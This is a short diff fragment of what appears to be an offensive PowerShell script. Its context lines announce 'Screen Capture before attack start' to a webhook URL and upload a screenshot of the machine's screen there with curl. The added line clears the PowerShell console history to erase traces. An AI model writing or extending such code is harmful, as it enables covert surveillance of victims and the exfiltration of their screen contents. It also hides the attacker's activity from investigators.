@@ -105,3 +105,5 @@ function version-av {
   $Body=@{ content = "**Screen Capture before attack start**"};
   Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
   curl.exe -F "file2=@$screencapture.jpg" $url;
+
+[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
